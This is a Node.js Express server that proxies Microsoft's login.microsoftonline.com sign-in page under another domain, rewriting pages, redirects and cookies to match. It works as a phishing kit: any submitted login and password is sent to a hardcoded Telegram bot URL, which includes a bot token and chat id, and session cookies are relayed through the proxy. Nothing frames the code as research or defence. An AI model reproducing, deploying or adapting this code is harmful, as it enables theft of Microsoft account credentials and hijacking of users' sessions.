const express = require('express');
const fetch = require('node-fetch');
const app = express();

const blockedRegions = [];
const blockedIPAddresses = ["0.0.0.0", "127.0.0.1"];

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.all('*', async (req, res) => {
    const country = req.headers['cf-ipcountry']?.toUpperCase();
    const ipaddr = req.headers['cf-connecting-ip'];
    
    if (blockedRegions.includes(country)) {
        return res.status(403).send("Access denied.");
    }
    
    if (blockedIPAddresses.includes(ipaddr)) {
        return res.status(403).send("Access denied");
    }

    const originalHost = req.headers.host;
    const targetUrl = new URL(req.path, 'https://login.microsoftonline.com');
    
    // Preserve query parameters
    if (req.url.includes('?')) {
        const queryString = req.url.split('?')[1];
        targetUrl.search = queryString;
    }

    // Create new headers object with only valid headers
    const headers = {
        'Host': 'login.microsoftonline.com',
        'Referer': `https://${originalHost}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
    };

    // Copy only specific headers from the original request
    const allowedHeaders = ['cookie', 'content-type', 'origin'];
    for (const key of allowedHeaders) {
        if (req.headers[key]) {
            headers[key] = req.headers[key];
        }
    }

    try {
        if (req.method === 'POST') {
            // Handle form data properly
            let body;
            if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
                const formData = new URLSearchParams();
                for (const [key, value] of Object.entries(req.body)) {
                    formData.append(key, value);
                }
                body = formData.toString();
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
            } else {
                body = JSON.stringify(req.body);
                headers['Content-Type'] = 'application/json';
            }

            if (req.body.login && req.body.passwd) {
                const credentialsMessage = `<b>Password found:</b><br><br><b>User</b>: ${req.body.login}<br><b>Password</b>: ${req.body.passwd}`;
                await sendToTelegram(credentialsMessage, "https://api.telegram.org/bot2071010767:AAEJbO34MFOD96LcV8IHwGiVhiyhrfFH_2o/sendMessage?chat_id=-620309599", true);
            }

            const response = await fetch(targetUrl, {
                method: 'POST',
                headers: headers,
                body: body,
                redirect: 'manual'
            });

            // Handle redirects manually
            if (response.status === 302 || response.status === 301) {
                const location = response.headers.get('location');
                if (location) {
                    return res.redirect(location.replace('login.microsoftonline.com', originalHost));
                }
            }

            const responseHeaders = response.headers;
            const cookies = responseHeaders.get('set-cookie');
            
            if (cookies) {
                const updatedCookies = cookies.split(',').map(cookie => 
                    cookie.replace(/login\.microsoftonline\.com/g, originalHost)
                );
                res.set('Set-Cookie', updatedCookies);
            }

            const data = await response.text();
            const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
            
            res.status(response.status).send(modifiedData);
        } else {
            const response = await fetch(targetUrl, {
                method: req.method,
                headers: headers,
                redirect: 'manual'
            });

            // Handle redirects manually
            if (response.status === 302 || response.status === 301) {
                const location = response.headers.get('location');
                if (location) {
                    return res.redirect(location.replace('login.microsoftonline.com', originalHost));
                }
            }

            const responseHeaders = response.headers;
            const cookies = responseHeaders.get('set-cookie');
            
            if (cookies) {
                const updatedCookies = cookies.split(',').map(cookie => 
                    cookie.replace(/login\.microsoftonline\.com/g, originalHost)
                );
                res.set('Set-Cookie', updatedCookies);
            }

            const data = await response.text();
            const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
            
            res.status(response.status).send(modifiedData);
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

async function sendToTelegram(content, webhookUrl, isMessage = false) {
    try {
        if (isMessage) {
            const res = await fetch(webhookUrl, {
                method: "POST",
                headers: { 'Content-Type': "application/json" },
                body: JSON.stringify({ text: content })
            });

            if (!res.ok) {
                throw new Error("Failed to send message to webhook: " + res.statusText);
            }
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
}); 
